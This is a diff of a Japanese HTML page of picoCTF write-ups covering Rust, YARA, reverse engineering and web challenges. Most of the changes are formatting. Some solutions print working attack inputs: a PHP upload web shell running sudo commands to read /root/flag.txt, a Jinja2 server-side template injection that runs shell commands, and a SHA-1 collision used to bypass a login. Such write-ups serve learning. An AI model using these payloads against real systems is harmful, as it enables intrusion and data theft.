+decrypt(encrypted_buffer, &party_foul);</code></pre>
+			<pre><code>fn decrypt(encrypted_buffer:Vec&lt;u8&gt;, borrowed_string: &<b>mut</b> String){
+:
+let <b>mut</b> party_foul = String::from("Using memory unsafe languages is a: ");
+decrypt(encrypted_buffer, &<b>mut</b> party_foul);</code></pre>
+			<p><a href="https://doc.rust-jp.rs/book-ja/ch04-02-references-and-borrowing.html#%E5%8F%AF%E5%A4%89%E3%81%AA%E5%8F%82%E7%85%A7" target="_blank">>> 参照と借用 - The Rust Programming Language 日本語版</a></p>
 			<p>mut をつけて可変な参照にする</p>
 		</div>
 		<div>
@@ -471,14 +516,25 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 		</div>
 		<div><p><code>picoCTF{4r3_y0u_h4v1n5_********}</code></p></div>
 		<details style="padding-left: 15px;"><summary><small>関数の後に<code>party_foul</code>を使うことはないため、参照でなく所有権を渡しても良い。その場合</small></summary>
-			<p><pre><code>fn decrypt(encrypted_buffer:Vec&lt;u8&gt;, <b>mut</b> borrowed_string: String){<br>:<br>let party_foul = String::from("Using memory unsafe languages is a: ");<br>decrypt(encrypted_buffer, party_foul);</code></pre></p>
+			<pre><code>fn decrypt(encrypted_buffer:Vec&lt;u8&gt;, <b>mut</b> borrowed_string: String){
+:
+let party_foul = String::from("Using memory unsafe languages is a: ");
+decrypt(encrypted_buffer, party_foul);</code></pre>
 		</details>
 	</details>
 	<details class="solved"><summary>100 points | Rust fixme 3</summary>
 		<div>
-			<p><pre><code>// unsafe {<br>:<br>let decrypted_slice = <u class="red_wavy">std::slice::from_raw_parts(decrypted_ptr, decrypted_len)</u>;<br>:<br>// }</code></pre></p>
-			<p><pre><code>unsafe {<br>:<br>let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);<br>:<br>}</code></pre></p>
-			<p><a target="_blank" href="https://doc.rust-jp.rs/book-ja/ch19-01-unsafe-rust.html">>> Unsafe Rust - The Rust Programming Language 日本語版</a></p>
+			<pre><code>// unsafe {
+:
+let decrypted_slice = <u class="red_wavy">std::slice::from_raw_parts(decrypted_ptr, decrypted_len)</u>;
+:
+// }</code></pre>
+			<pre><code>unsafe {
+:
+let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);
+:
+}</code></pre>
+			<p><a href="https://doc.rust-jp.rs/book-ja/ch19-01-unsafe-rust.html" target="_blank">>> Unsafe Rust - The Rust Programming Language 日本語版</a></p>
 			<p>まとめてunsafeを明示する</p>
 		</div>
 		<div>
@@ -488,14 +544,17 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 	</details>
 	<details class="solved"><summary>200 points | YaraRules0x100</summary>
 		<div>
-			<p><a target="_blank" href="https://yara.readthedocs.io/en/latest/writingrules.html">>> Writing YARA rules — yara 4.5.0 documentation</a></p>
+			<p><a href="https://yara.readthedocs.io/en/latest/writingrules.html" target="_blank">>> Writing YARA rules — yara 4.5.0 documentation</a></p>
 			<p>YARA rulesとはマルウェアを検出するツールに使われる文法らしい</p>
 			<p>試しに一番上にあるdummy(全てマルウェアでないと検出する)を提出してみる</p>
 		</div>
 		<div>
-			<p><pre><code>rule dummy{<br>&Tab;condition:<br>&Tab;&Tab;false<br>}</code></pre>
+			<pre><code>rule dummy{
+	condition:
+		false
+}</code></pre>
 			<pre><code class="bash">socat -t60 - TCP:standard-pizzas.picoctf.net:XXXXX &lt; sample.txt</code></pre>
-			<pre><code>Status: Failed
+			<pre><code class="output">Status: Failed
 False Negatives Check: Testcase failed. Your rule generated a false negative.
 False Positives Check: Testcases passed!
 Stats: 61 testcase(s) passed. 1 failed. 2 testcase(s) unchecked. 64 total testcases.
@@ -505,12 +564,18 @@ Pass all the testcases to get the flag.</code></pre>
 		<div>
 			<p>64テストケース中61ケースがfalseで通ることが分かる。</p>
 			<p>与えられたマルウェアの特徴を詳細に分析しなくても通りそう</p>
-			<p><a target="_blank" href="https://gitlab.com/devill.tamachan/binaryeditorbz/-/blob/master/README.md">>> BzEditor</a> でバイナリを見てみると、</p>
+			<p><a href="https://gitlab.com/devill.tamachan/binaryeditorbz/-/blob/master/README.md" target="_blank">BzEditor</a>でバイナリを見てみると、</p>
 			<p>特に0x6230以降、xmlの中身やdllの名前があり、絞り込めそう</p>
 			<p>orよりはandで絞り込む方が感覚的に楽なので、それぞれの条件がFalse Negatives Checkを通っていることを確認しながらandするものを増やしていく</p>
 		</div>
 		<div>
-			<p><pre><code>rule dummy{<br>&Tab;strings:<br>&Tab;&Tab;$a = "standalone='yes'"<br>&Tab;&Tab;$b = "ADVAPI32.dll"<br>&Tab;condition:<br>&Tab;&Tab;$a and $b<br>}</code></pre>
+			<pre><code>rule dummy{
+	strings:
+		$a = "standalone='yes'"
+		$b = "ADVAPI32.dll"
+	condition:
+		$a and $b
+}</code></pre>
 			<p>とすると、フラグを入手できた</p>
 		</div>
 		<div><p><code>picoCTF{yara_rul35_r0ckzzz_********}</code></p></div>
@@ -518,19 +583,22 @@ Pass all the testcases to get the flag.</code></pre>
 	<h2>Reverse Engineering</h2>
 	<details class="solved"><summary>&nbsp;75 points | Flag Hunters</summary>
 		<div>
-			<p>コードの内容は、概要だけを言えば REFRAIN(繰り返し) が含まれる曲を</p>
-			<p>[1番][繰り返し][2番][繰り返し][ ...</p>
+			<p>REFRAIN(繰り返し) が含まれる曲を</p>
+			<p><code>1番</code><code>繰り返し</code><code>2番</code><code>繰り返し</code><code>...</code></p>
 			<p>のように出力している。</p>
 		</div>
 		<div>
 			<p>各行を処理する際、<code>;</code>を区切り文字として分割された文字列をそれぞれ処理している。</p>
 		</div>
 		<div>
-			<p><pre><code>elif re.match(r"CROWD.*", line)<br>&Tab;crowd = input('Crowd: ')<br>&Tab;song_lines[lip] = 'Crowd: ' + crowd</code></pre></p>
+			<pre><code>elif re.match(r"CROWD.*", line)
+	crowd = input('Crowd: ')
+	song_lines[lip] = 'Crowd: ' + crowd</code></pre>
 			<p>この部分で歌詞データに追加できることが分かる</p>
 		</div>
 		<div>
-			<p><pre><code>elif re.match(r"RETURN [0-9]+", line):<br>&Tab;lip = int(line.split()[1])</code></pre></p>
+			<pre><code>elif re.match(r"RETURN [0-9]+", line):
+	lip = int(line.split()[1])</code></pre>
 			<p>繰り返し部を歌う直前に、繰り返し部を歌ったあとに戻る位置が指定されている</p>
 			<p>繰り返しを歌った後にFlagが出力される位置に戻ってほしいので、先ほどの入力で</p>
 			<p><code>; RETURN 0</code></p>
@@ -540,19 +608,19 @@ Pass all the testcases to get the flag.</code></pre>
 		<div><p><code>picoCTF{70637h3r_f0r3v3r_********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>200 points | Binary Instrumentation 1</summary>
-		<div>わからない</div>
+		<p>APIをどうやって呼び出しているのかわからない</p>
 	</details>
 	<details class="unsolved"><summary>200 points | Tap into Hash</summary>
-		<div>わからない</div>
+		<p>わからない</p>
 	</details>
 	<details class="solved"><summary>200 points | Chronohack</summary>
 		<div>
-			<p>コードの内容を見ると、<code>get_random(20)</code>でトークンを生成している</p>
+			<p><code>get_random(20)</code>でトークンを生成している</p>
 			<p><code>random.seed(int(time.time() * 1000))</code>から、UNIXtimeのミリ秒で乱数を初期化していることが分かる</p>
 		</div>
 		<div>
-			<p>現在時刻を元にトークンを生成してから送っても、フラグを得ることはできなかった。</p>
-			<p>これは通信のラグだと思ったので、現在時刻のミリ秒を1ずつ足していって50回認証してみる</p>
+			<p>現在時刻のミリ秒を元にトークンを生成してから送っても、フラグを得ることはできなかった。</p>
+			<p>これは通信のラグだと思ったので、現在時刻のミリ秒を1ずつ足していって50まで認証してみる</p>
 			<p>が、それでも得ることができなかったので、最初に50足した後に1ずつ足していって100まで認証すると、フラグを得ることができた</p>
 		</div>
 		<div><p><code>picoCTF{70637h3r_f0r3v3r_********}</code></p></div>
@@ -592,19 +660,19 @@ Pass all the testcases to get the flag.</code></pre>
 		<div><p><code>picoCTF{python_is_weird********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>300 points | Binary Instrumentation 2</summary>
-		<div>わからない</div>
+		<p>1と同様、わからない</p>
 	</details>
 	<details class="solved"><summary>400 points | perplexed</summary>
 		<div>
-			<p>Binary Ninja Free で読んでみると、</p>
+			<p><a href="https://binary.ninja/free/" target="_blank">Binary Ninja Free</a>でデコンパイルして読んでみると、</p>
 			<p><code>0xe1a71ef875237b61b99dfc5a5bdf69d2fe1bedf4ed67f4</code></p>
 			<p>を7ビットごとに取り出して、入力文字列の下位7ビットと等しければ認証されることがわかる</p>
 		</div>
 		<div>
-			<pre><code>#include <iostream>
-#include <array>
+			<pre><code>#include &lt;iostream&gt;
+#include &lt;array&gt;
 
-const std::array<uint8_t, 23> data = 
+const std::array&lt;uint8_t, 23&gt; data = 
 {
 	0xe1, 0xa7, 0x1e, 0xf8, 0x75, 0x23, 0x7b, 0x61, 0xb9, 0x9d, 0xfc, 0x5a, 0x5b, 0xdf, 0x69, 0xd2,
 	0xfe, 0x1b, 0xed, 0xf4, 0xed, 0x67, 0xf4
@@ -615,8 +683,8 @@ char out[30];
 int main(){
 	int cnt = 0;
 	for(uint8_t i : data){
-		for(int j = 0; j < 8; ++j){
-			out[cnt / 7] |= ((i >> (7 - j)) & 1) << (6 - (cnt % 7));
+		for(int j = 0; j &lt; 8; ++j){
+			out[cnt / 7] |= ((i >> (7 - j)) & 1) &lt;&lt; (6 - (cnt % 7));
 			cnt ++;
 		}
 	}
@@ -632,46 +700,45 @@ int main(){
 			<p><q>Me no need password. Me just need cookies!</q></p>
 			<p>と言われる。クッキーを確認すると</p>
 			<p>secret_recipe: <code>cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzX0FDOEZDRDc1fQ%3D%3D</code></p>
-			<p>とあったので、</p>
-			<p><code>%3D</code>を<code>=</code>になおしてBase64でデコードすると</p>
+			<p>とあったので、<code>%3D</code>を<code>=</code>になおしてBase64でデコードするとフラグを入手できた</p>
 		</div>
 		<div><p><code>picoCTF{c00k1e_m0nster_l0ves_c00kies_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>&nbsp;50 points | head-dump</summary>
 		<div>
 			<p>ページ内を見てみると、#API Documentation にAPIのドキュメントへのリンクがあった</p>
-			<p>問題文みたいな名前の heapdump を Try it out -> Excute してみると、レスポンスをダウンロードできる</p>
-			<p>ダウンロードしたheapdump内で<code>pico</code>を検索すると、フラグを見つけることができた</p>
+			<p>問題文みたいな名前の<code>heapdump</code>を<code>Try it out</code>-&gt;<code>Excute</code>してみると、レスポンスをダウンロードできる</p>
+			<p>ダウンロードした<code>heapdump</code>内で<code>pico</code>を検索すると、フラグを見つけることができた</p>
 		</div>
 		<div><p><code>picoCTF{Pat!3nt_15_Th3_K3y_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>100 points | n0s4n1ty 1</summary>
 		<div>
-			<p>試しにファイルをアップロードしみると、<code>uploads.php</code>に送られ、</p>
-			<p><code>The file [ファイル名] has been uploaded Path: uploads/[ファイル名]</code>との表示が出た</p>
-			<p>また、<code>uploads/[ファイル名]</code>に移動すると、内容が表示された(画像ファイルなら画像が表示され、テキストファイルならテキストが表示された)</p>
+			<p>試しにファイルをアップロードしみると、<code>uploads.php</code>に転送され、</p>
+			<p><code class="output">The file [ファイル名] has been uploaded Path: uploads/[ファイル名]</code>との表示が出た</p>
+			<p>また、<code>uploads/[ファイル名]</code>に移動すると、内容が表示された。(画像ファイルなら画像が表示され、テキストファイルならテキストが表示された)</p>
 			<p>phpで処理されていることから、phpファイルを送信すればその内容が実行されると考える</p>
 		</div>
 		<div>
 			<p><code>send.php</code>の内容を</p>
-			<p><code><?php system("sudo ls /root") ?></code></p>
+			<p><code>&lt;?php system("sudo ls /root") ?&gt;</code></p>
 			<p>として送信すると、<code>/uploads/send.php</code>では</p>
-			<p><code>flag.txt</code>と表示された</p>
+			<p><code class="output">flag.txt</code>と表示された</p>
 		</div>
 		<div>
 			<p><code>send.php</code>の内容を</p>
-			<p><code><?php system("sudo cat /root/flag.txt") ?></code></p>
-			<p>として送信すると、<code>/uploads/send.php</code>でフラグが表示された</p>
+			<p><code>&lt;?php system("sudo cat /root/flag.txt") ?&gt;</code></p>
+			<p>として再度送信すると、<code>/uploads/send.php</code>でフラグが表示された</p>
 		</div>
 		<div><p><code>picoCTF{wh47_c4n_u_d0_wPHP_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>100 points | SSTI1</summary>
 		<div>
 			<p>いろいろ送ってみると<code>{{</code>で500エラーが送られてきた</p>
-			<p>いろいろ調べてみると、このサーバーはJinja2を使っていることが分かる</p>
+			<p>いろいろ調べてみると、このサーバーは<code>Jinja2</code>を使っていることが分かる</p>
 		</div>
 		<div>
-			<p><code>{{request.application.__globals__.__builtins__.__import__('os').popen('<code>[任意のコード]</code>').read()}}</code></p>
+			<p><code>{{request.application.__globals__.__builtins__.__import__('os').popen('[任意のコード]').read()}}</code></p>
 			<p>で任意のコードが実行可能みたいなので、</p>
 			<p><code>{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}</code>とすると</p>
 			<p><code>flag</code>というファイルがあることがわかる</p>
@@ -685,10 +752,10 @@ int main(){
 	<details class="solved"><summary>200 points | WebSockFish</summary>
 		<div>
 			<p>チェスの対戦が始まる</p>
-			<p>普通にチェスをやっても、買ったりしても、フラグをもらることはない</p>
+			<p>普通にチェスをやっても、勝ったりしても、フラグを貰えることはない</p>
 		</div>
 		<div>
-			<p><a href="https://portswigger.net/burp/communitydownload">Burp Suite Community Edition</a>等で通信を見ると、</p>
+			<p><a href="https://portswigger.net/burp/communitydownload" target="_blank">>> Burp Suite Community Edition</a>等で通信を見ると、</p>
 			<p>コマを動かすたびに<code>WebSocket</code>で<code>eval [数値]</code>といったデータを送信し、数値に応じたメッセージが返されている</p>
 		</div>
 		<div>
@@ -709,7 +776,7 @@ int main(){
 		<div><p><code>picoCTF{D0nt_Use_Unsecure_f@nctions********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>200 points | SSTI2</summary>
-		<div>わからない</div>
+		<p>回避法がわからない</p>
 	</details>
 	<details class="solved"><summary>300 points | Apriti sesamo</summary>
 		<div>
@@ -719,45 +786,45 @@ int main(){
 		</div>
 		<div>
 			<p>phpコードを読みやすくすると、</p>
-			<p><pre><code>if(isset($_POST["username"]) && isset($_POST["pwd"])){
+			<pre><code>if(isset($_POST["username"]) && isset($_POST["pwd"])){
 	$yuf85e0677=$_POST["username"];
 	$rs35c246d5=$_POST["pwd"];
 	if($yuf85e0677==$rs35c246d5){
-		echo "<br/>Failed! No flag for you";
+		echo "&lt;br/&gt;Failed! No flag for you";
 	}
 	else{
 		if(sha1($yuf85e0677)===sha1($rs35c246d5)){
 			echo file_get_contents("../flag.txt");
 		}
 		else{
-			echo "<br/>Failed! No flag for you";
+			echo "&lt;br/&gt;Failed! No flag for you";
 		}
 	}
-}</code></pre></p>
+}</code></pre>
 			<p>という内容だった</p>
 		</div>
 		<div>
 			<p>内容は異なるがsha1は同じものをユーザー名とパスワードに設定すれば良さそう</p>
 			<p>調べると、</p>
-			<p>Googleが発表したsha1の衝突例<a href="https://shattered.io/">SHAttered</a>があったが、少々長いので他を探すと、</p>
-			<p>GitHubが衝突例<a href="https://sha-mbles.github.io/">SHA-1 is a Shambles</a>があった。</p>
-			<p>Burp Suite Community Edition を用いて</p>
+			<p>Googleが発表したsha1の衝突例<a href="https://shattered.io/" target="_blank">SHAttered</a>があったが、少々長いので他を探すと、</p>
+			<p>GitHubが発表した衝突例<a href="https://sha-mbles.github.io/" target="_blank">SHA-1 is a Shambles</a>があった。</p>
+			<p><a href="https://portswigger.net/burp/communitydownload" target="_blank">Burp Suite Community Edition</a>を用いて</p>
 			<p><code>messageA</code>と<code>messageB</code>をそれぞれ<code>username</code>と<code>pwd</code>に設定しPOSTすると、フラグを入手できた</p>
 		</div>
 		<div><p><code>picoCTF{w3Ll_d3sErV3d_Ch4mp_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>300 points | Pachinko</summary>
 		<div>
-			<p><b>なにもわかっていないけどこれでフラグを入手できた</b></p>
+			<p><b>なにもわかっていないけどこれでフラグを入手できました</b></p>
 			<img src="/images/0001/pachinko.png" width="450">
 		</div>
 		<div><p><code>picoCTF{p4ch1nk0_f146_0n3_********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>500 points | Pachinko Revisited</summary>
-		<div></div>
+		<p>全く分からない</p>
 	</details>
 	<details class="unsolved"><summary>500 points | secure-email-service</summary>
-		<div></div>
+		<p>全く分からない</p>
 	</details>
 </body>
 </html>
